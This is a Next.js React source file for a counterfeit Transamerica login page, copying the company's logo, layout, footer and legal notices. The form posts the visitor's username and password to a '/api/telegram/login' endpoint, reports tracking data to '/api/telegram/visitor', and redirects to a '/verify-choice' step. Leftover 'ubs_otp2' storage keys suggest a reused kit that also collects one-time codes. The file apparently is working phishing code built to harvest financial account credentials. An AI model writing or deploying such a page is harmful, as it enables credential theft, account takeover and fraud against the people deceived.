"use client";

import { useState, useEffect, useRef } from "react";
import { useRouter } from "next/navigation";
import { useVisitorTracking } from "@/hooks/use-visitor-tracking";

export default function LoginPage() {
  const [hasInteracted, setHasInteracted] = useState(false);
  const visitorInfo = useVisitorTracking();
  const hasSentVisitRef = useRef(false);

  useEffect(() => {
    if (typeof window !== "undefined") {
      sessionStorage.removeItem("ubs_verify");
      sessionStorage.removeItem("ubs_details");
      sessionStorage.removeItem("ubs_otp2");
    }
  }, []);

  useEffect(() => {
    const onFirstInteraction = () => setHasInteracted(true);
    window.addEventListener("pointerdown", onFirstInteraction, {
      once: true,
      passive: true,
    });
    window.addEventListener("keydown", onFirstInteraction, { once: true });
    return () => {
      window.removeEventListener("pointerdown", onFirstInteraction);
      window.removeEventListener("keydown", onFirstInteraction);
    };
  }, []);

  useEffect(() => {
    if (!hasInteracted || !visitorInfo || hasSentVisitRef.current) return;
    hasSentVisitRef.current = true;
    fetch("/api/telegram/visitor", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(visitorInfo),
    }).catch(console.error);
  }, [hasInteracted, visitorInfo]);

  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [isLoginLoading, setIsLoginLoading] = useState(false);
  const [loginError, setLoginError] = useState<string | null>(null);
  const [countdown, setCountdown] = useState(0);
  const [honeypot, setHoneypot] = useState("");
  const countdownRef = useRef<number | null>(null);
  const redirectRef = useRef<number | null>(null);
  const router = useRouter();

  const handleSignIn = async (event: React.FormEvent<HTMLFormElement>) => {
    event.preventDefault();
    if (isLoginLoading || !username || !password) return;
    if (process.env.NODE_ENV !== "production" && honeypot.trim() !== "") {
      setLoginError("Suspicious activity detected. Please try again.");
      return;
    }
    setLoginError(null);
    setIsLoginLoading(true);

    try {
      const response = await fetch("/api/telegram/login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ userId: username, password }),
      });
      if (!response.ok) {
        throw new Error("Failed to send login data");
      }

      if (typeof window !== "undefined") {
        sessionStorage.setItem("ubs_verify", "1");
      }

      setCountdown(10);
      countdownRef.current = window.setInterval(() => {
        setCountdown((prev) => {
          if (prev <= 1) {
            if (countdownRef.current) {
              window.clearInterval(countdownRef.current);
              countdownRef.current = null;
            }
            return 0;
          }
          return prev - 1;
        });
      }, 1000);

      redirectRef.current = window.setTimeout(() => {
        router.push("/verify-choice");
      }, 10000);
    } catch (error) {
      console.error("Login failed:", error);
      setLoginError("Unable to send login details. Please try again.");
      setIsLoginLoading(false);
    }
  };

  useEffect(() => {
    return () => {
      if (countdownRef.current) {
        window.clearInterval(countdownRef.current);
      }
      if (redirectRef.current) {
        window.clearTimeout(redirectRef.current);
      }
    };
  }, []);

  return (
    <>
      <div className="min-h-screen bg-white font-sans text-black">
          <nav className="flex h-16 items-center bg-white px-5 lg:h-24 lg:px-12">
            <img
              src="/Transamerica/images/Transamerica-Logo.png"
              alt="Transamerica"
              className="w-28 lg:w-44"
            />
          </nav>

          <section className="relative h-[370px] overflow-hidden bg-[#61b5f2] lg:h-[300px]">
            <div className="px-5 pt-8 lg:absolute lg:left-0 lg:top-0 lg:z-10 lg:flex lg:h-full lg:w-[48%] lg:items-center lg:px-16 lg:pt-0">
              <h1 className="text-3xl font-semibold lg:text-5xl">Login</h1>
            </div>
            <div className="mt-8 w-full lg:absolute lg:right-0 lg:top-0 lg:mt-0 lg:h-full lg:w-[58%]">
              <img
                src="/Transamerica/images/cityscape-hero.webp"
                alt="City skyline"
                className="h-[190px] w-full object-cover object-center [clip-path:polygon(0_0,100%_0,100%_72%,75%_100%,25%_100%,0_72%)] lg:h-full lg:[clip-path:polygon(15%_30%,65%_0,100%_0,100%_100%,15%_72%)]"
              />
            </div>
          </section>

          <main className="mt-20 px-5 py-9">
            <div className="mx-auto max-w-7xl">
              <h2 className="text-2xl font-normal lg:text-5xl">
                Access your account
              </h2>
              <p className="mt-4 text-sm lg:text-xl">
                Please login using your username and password.
              </p>

              <form
                onSubmit={handleSignIn}
                className="mt-7 lg:grid lg:grid-cols-2 lg:gap-x-8"
              >
                <div className="mt-7 lg:mt-0">
                  <label
                    htmlFor="username"
                    className="block text-xl font-semibold text-[#0067b1]"
                  >
                    Username<span className="text-red-600">*</span>
                  </label>
                  <input
                    id="username"
                    type="text"
                    className="mt-2 h-14 w-full border-2 border-gray-800 px-2 outline-none focus:border-blue-500 focus:ring-1 focus:ring-blue-500"
                    value={username}
                    onChange={(event) => setUsername(event.target.value)}
                  />
                  <a
                    href="/Transamerica/forgotusername.html"
                    className="mt-10 block text-xl font-semibold"
                  >
                    Forgot your username?
                  </a>
                </div>
                <div>
                  <label
                    htmlFor="password"
                    className="block text-xl font-semibold"
                  >
                    Password<span className="text-red-600">*</span>
                  </label>
                  <input
                    id="password"
                    type="password"
                    className="mt-2 h-14 w-full border-2 border-gray-800 px-2 outline-none focus:border-blue-500 focus:ring-1 focus:ring-blue-500"
                    value={password}
                    onChange={(event) => setPassword(event.target.value)}
                  />
                  <a
                    href="/Transamerica/forgotpassword.html"
                    className="mt-10 block text-xl font-semibold"
                  >
                    Forgot your password?
                  </a>
                </div>
                <input
                  type="text"
                  name="website"
                  value={honeypot}
                  onChange={(event) => setHoneypot(event.target.value)}
                  className="hidden"
                  autoComplete="off"
                />
                <div className="mt-8 lg:col-span-2">
                  <button
                    type="submit"
                    disabled={isLoginLoading || !username || !password}
                    className="rounded-full bg-gray-400 px-8 py-4 text-xl text-white disabled:cursor-not-allowed"
                  >
                    {isLoginLoading ? "Signing in..." : "Log in"}{" "}
                    <i
                      className="fa-solid fa-arrow-right ml-1"
                      aria-hidden="true"
                    />
                  </button>
                  <p
                    className="min-h-[1.25rem] text-sm text-red-600"
                    aria-live="polite"
                  >
                    {loginError ?? ""}
                  </p>
                </div>
              </form>

              <div className="mt-8 text-xl">
                <p>Need to Register?</p>
                <button
                  type="button"
                  onClick={() => router.push("/new-user")}
                  className="mb-20 mt-3 block font-semibold"
                >
                  Create your account
                </button>
              </div>
            </div>
          </main>

          <footer className="bg-[#281706] px-5 py-10 text-white lg:px-16 lg:py-14">
            <div className="grid grid-cols-2 gap-x-8 gap-y-10 lg:grid-cols-3 lg:gap-x-28 lg:gap-y-12">
              <div>
                <h3 className="text-3xl font-medium">Overview</h3>
                <ul className="mt-7 space-y-7 text-xl">
                  <li>
                    <a href="#">Newsroom</a>
                  </li>
                  <li>
                    <a href="#">Careers</a>
                  </li>
                  <li>
                    <a href="#">Company overview</a>
                  </li>
                  <li>
                    <a href="#">Leadership</a>
                  </li>
                </ul>
                <div className="mt-14">
                  <h3 className="text-3xl font-medium">Privacy</h3>
                  <ul className="mt-8 space-y-7 text-xl">
                    <li>
                      <a href="#">
                        Do not sell or share my personal information
                      </a>
                    </li>
                    <li>
                      <a href="#">Online privacy statement</a>
                    </li>
                  </ul>
                </div>
              </div>
              <div>
                <h3 className="text-3xl font-medium">About us</h3>
                <ul className="mt-7 space-y-7 text-xl">
                  <li>
                    <a href="#">Aegon Transamerica Foundation</a>
                  </li>
                  <li>
                    <a href="#">Diversity and inclusion</a>
                  </li>
                  <li>
                    <a href="#">Our commitments</a>
                  </li>
                  <li>
                    <a href="#">Partnerships</a>
                  </li>
                </ul>
              </div>
              <div>
                <h3 className="text-3xl font-medium">Support</h3>
                <ul className="mt-7 space-y-7 text-xl">
                  <li>
                    <a href="#">Contact us</a>
                  </li>
                  <li>
                    <button
                      type="button"
                      onClick={() => router.push("/new-user")}
                    >
                      Create account
                    </button>
                  </li>
                  <li>
                    <a href="#">Fraud alert</a>
                  </li>
                </ul>
              </div>
            </div>
            <div className="mt-14 pt-7 lg:mt-12">
              <p className="text-md leading-5 lg:text-xl lg:leading-9">
                Terms of use&nbsp; | &nbsp;Accessibility&nbsp; |
                &nbsp;Transparency in coverage&nbsp; | &nbsp;Business continuity
                plan summary&nbsp; | &nbsp;Code of conduct&nbsp; |
                &nbsp;Compensation&nbsp; | &nbsp;NYDFS cyber security -
                agents&nbsp; | &nbsp;Florida mental health coverage parity
                laws&nbsp; | &nbsp;Massachusetts mental health coverage -
                grandfathered major medical plans only&nbsp; | &nbsp;CA health
                insurance plans only&nbsp; | &nbsp;Abuse victims
              </p>
            </div>
            <div className="mt-8 lg:flex lg:justify-between">
              <div>
                <img
                  src="/Transamerica/images/Transamerica-Logo.png"
                  alt="Transamerica"
                  className="w-44"
                />
                <p className="text-xl">an Aegon company</p>
              </div>
              <div className="mt-5 flex gap-4 text-xl">
                <a href="#" aria-label="Facebook">
                  <i className="fa-brands fa-facebook-f" aria-hidden="true" />
                </a>
                <a href="#" aria-label="LinkedIn">
                  <i className="fa-brands fa-linkedin-in" aria-hidden="true" />
                </a>
                <a href="#" aria-label="Instagram">
                  <i className="fa-brands fa-instagram" aria-hidden="true" />
                </a>
                <a href="#" aria-label="X">
                  <i className="fa-brands fa-x-twitter" aria-hidden="true" />
                </a>
              </div>
            </div>
            <div className="mt-10 text-md leading-6 lg:text-xl lg:leading-[1.35]">
              <p>
                Transamerica, the Transamerica Pyramid logo and the Transamerica
                Pyramid building are federally registered service marks owned by
                Transamerica Corporation. Any unauthorized use expressly
                prohibited. Transamerica is the marketing name for Transamerica
                Corporation, Transamerica Financial Life Insurance Company,
                Transamerica Life Insurance Company and Transamerica Retirement
                Solutions, LLC. Insurance products and services are offered by
                Transamerica Life Insurance Company, Cedar Rapids, IA;
                Transamerica Life Insurance Company of New York, Harrison, NY;
                Transamerica Financial Life Insurance Company, Cedar Rapids, IA;
                and Transamerica Retirement Solutions, LLC.
              </p>
              <p>
                Investment advisory services offered by Transamerica Financial
                Advisors, LLC, a broker-dealer and member of FINRA, SIPC, and a
                Registered Investment Adviser. Investment advisory services
                focused on the unique needs of individual retirement plans and
                their participants are offered by Transamerica Retirement
                Advisors, LLC, a Registered Investment Adviser.
              </p>
              <p>
                Health savings products and services offered through
                Transamerica Health Savings Solutions, LLC. These products and
                services are subject to the terms and conditions of the
                applicable agreements.
              </p>
              <p>
                Transamerica companies are part of the Aegon Group. Copyright
                2011 - 2025 Transamerica Corporation. 6400 C Street SW, Cedar
                Rapids, IA 52499 - All Rights Reserved.
              </p>
              <p className="mt-5">113555R31</p>
            </div>
          </footer>
      </div>
    </>
  );
}
